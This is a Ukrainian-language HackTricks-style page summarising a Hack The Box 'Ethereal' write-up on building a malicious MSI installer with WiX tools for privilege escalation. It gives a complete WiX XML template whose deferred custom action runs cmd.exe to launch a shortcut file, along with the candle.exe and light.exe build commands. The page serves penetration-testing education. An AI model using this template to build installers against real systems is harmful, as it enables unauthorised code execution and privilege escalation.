# Створення шкідливого MSI та отримання root

{{#include ../../banners/hacktricks-training.md}}

Створення інсталятора MSI виконуватиметься за допомогою wixtools, зокрема буде використано [wixtools](http://wixtoolset.org). Варто зазначити, що було випробувано альтернативні засоби створення MSI, але в цьому конкретному випадку вони не спрацювали.<sup>[[1]](#references)</sup>

Для повного розуміння прикладів використання wix MSI рекомендується переглянути [цю сторінку](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Тут наведено різні приклади, що демонструють використання wix MSI.<sup>[[2]](#references)</sup>

Мета полягає в тому, щоб створити MSI, який виконуватиме файл lnk. Для цього можна використати наведений нижче XML-код ([xml звідси](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Важливо зазначити, що елемент Package містить такі атрибути, як InstallerVersion і Compressed, які відповідно визначають версію інсталятора та вказують, чи є пакет стисненим.

Процес створення передбачає використання candle.exe — інструмента з wixtools — для генерування wixobject із msi.xml. Потрібно виконати таку команду:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Крім того, варто зазначити, що в публікації наведено зображення, на якому показано команду та її вивід. Ви можете звернутися до нього для наочного ознайомлення.<sup>[[1]](#references)</sup>

Також для створення MSI-файлу з wixobject буде використано light.exe — ще один інструмент із wixtools. Команда для виконання має такий вигляд:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Подібно до попередньої команди, у дописі додано зображення, що ілюструє команду та її результат.<sup>[[1]](#references)</sup>

Зверніть увагу, що хоча цей підсумок має на меті надати корисну інформацію, для отримання докладніших відомостей і точних інструкцій рекомендується звернутися до оригінального допису.<sup>[[1]](#references)</sup>

## Посилання

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (див. також [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
